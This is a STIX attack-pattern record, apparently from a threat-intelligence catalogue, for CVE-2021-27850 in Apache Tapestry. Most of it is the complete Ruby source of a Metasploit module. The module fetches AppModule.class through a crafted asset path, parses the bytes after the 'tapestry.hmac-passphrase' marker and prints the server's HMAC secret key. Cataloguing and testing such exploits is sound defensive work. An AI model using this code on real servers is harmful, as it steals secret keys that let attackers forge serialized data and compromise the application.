{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1413d150-f440-4283-a279-02de35ace7b1",
    "created": "2024-08-14T16:32:03.563961Z",
    "modified": "2024-08-14T16:32:03.563965Z",
    "name": "Apache Tapestry HMAC secret key leak",
    "description": " This exploit finds the HMAC secret key used in Java serialization by Apache Tapestry. This key is located in the file AppModule.class by default and looks like the standard representation of UUID in hex digits (hd) : 6hd-4hd-4hd-4hd-12hd If the HMAC key has been changed to look differently, this module won't find the key because it tries to download the file and then uses a specific regex to find the key.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/cve_2021_27850_apache_tapestry_hmac_key.rb",
            "external_id": "cve_2021_27850_apache_tapestry_hmac_key.rb"
        },
        {
            "source_name": "JohannesMoritz",
            "external_id": "#CVE"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-27850"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Tapestry HMAC secret key leak',\n        'Description' => %q{\n          This exploit finds the HMAC secret key used in Java serialization by Apache Tapestry. This key\n          is located in the file AppModule.class by default and looks like the standard representation of UUID in hex digits (hd) :\n          6hd-4hd-4hd-4hd-12hd\n          If the HMAC key has been changed to look differently, this module won't find the key because it tries to download the file\n          and then uses a specific regex to find the key.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Johannes Moritz', # CVE\n          'Yann Castel (yann.castel[at]orange.com)' # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2021-27850']\n        ],\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS ]\n        },\n        'DisclosureDate' => '2021-04-15'\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8080),\n      OptString.new('TARGETED_CLASS', [true, 'Name of the targeted java class', 'AppModule.class']),\n      OptString.new('TARGETURI', [true, 'The base path of the Apache Tapestry Server', '/'])\n    ])\n  end\n\n  def class_file\n    datastore['TARGETED_CLASS']\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/assets/app/something/services/', class_file, '/')\n    })\n\n    if res.nil?\n      Exploit::CheckCode::Unknown\n    elsif res.code == 302\n\n      id_url = res.redirection.to_s[%r{assets/app/(\\w+)/services/#{class_file}}, 1]\n      normalized_url = normalize_uri(target_uri.path, '/assets/app/', id_url, '/services/', class_file, '/')\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalized_url\n      })\n\n      if res.code == 200 && res.headers['Content-Type'] =~ %r{application/java.*}\n        print_good(\"Java file leak at #{rhost}:#{rport}#{normalized_url}\")\n        Exploit::CheckCode::Vulnerable\n      else\n        Exploit::CheckCode::Safe\n      end\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def run\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/assets/app/something/services/', class_file, '/')\n    })\n\n    unless res\n      print_bad('Apache Tapestry did not respond.')\n      return\n    end\n\n    id_url = res.redirection.to_s[%r{assets/app/(\\w+)/services/+#{class_file}}, 1]\n    normalized_url = normalize_uri(target_uri.path, '/assets/app/', id_url, '/services/', class_file, '/')\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalized_url\n    })\n\n    unless res\n      print_bad('Either target is not vulnerable or class file does not appear to exist.')\n      return\n    end\n\n    raw_class_file = res.body.to_s\n    if raw_class_file.empty?\n      print_bad(\"#{class_file} could not be obtained.\")\n      return\n    end\n\n    key_marker = 'tapestry.hmac-passphrase'\n    unless raw_class_file.include?(key_marker)\n      print_bad(\"HMAC key not found in #{class_file}.\")\n      return\n    end\n\n    # three bytes precede the key itself\n    # last two indicate the length of the key\n    key_start = raw_class_file.index(key_marker)\n    byte_start = key_start + key_marker.length + 1\n    key_size = raw_class_file[byte_start..byte_start + 1]\n    key_size = key_size.unpack('C*').join.to_i\n    byte_start += 2\n\n    key = raw_class_file[byte_start..byte_start + key_size - 1]\n    path = store_loot(\n      \"tapestry.#{class_file}\",\n      'application/binary',\n      rhost,\n      raw_class_file\n    )\n\n    print_good(\"Apache Tapestry class file saved at #{path}.\")\n    if key\n      print_good(\"HMAC key found: #{key}.\")\n    else\n      print_bad(\n        'Could not find key. ' \\\n        \"Please check #{path} in case key is in an unexpected format.\"\n      )\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-04-15"
}